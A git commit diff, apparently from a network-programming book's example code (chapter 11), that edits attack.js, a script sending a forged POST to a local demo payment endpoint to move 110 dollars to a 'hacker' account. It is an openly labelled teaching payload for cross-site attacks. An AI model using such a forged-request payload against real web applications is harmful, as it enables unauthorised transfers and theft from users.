36a50fddbc771d6b2585e68f2a6656f7068fbfd5
Brandon Rhodes <brandon@rhodesmill.org>
2014-09-28 18:56:36 -0400

    Fix the URL in attack.js

--- py3/chapter11/attack.js
+++ py3/chapter11/attack.js
@@ -2,5 +2,5 @@
 var x = new XMLHttpRequest();
 x.open('POST', 'http://localhost:5000/pay');
 x.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-x.send('account=hacker&dollars=110&message=Theft');
+x.send('account=hacker&dollars=110&memo=Theft');
 </script>
